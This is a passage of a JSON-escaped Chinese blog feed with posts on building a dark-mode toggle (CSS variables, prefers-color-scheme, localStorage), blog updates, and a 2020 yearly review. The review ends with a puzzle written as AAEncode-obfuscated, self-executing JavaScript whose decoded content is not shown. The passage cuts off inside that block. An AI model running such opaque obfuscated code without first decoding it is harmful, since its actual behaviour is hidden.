class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 18:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + 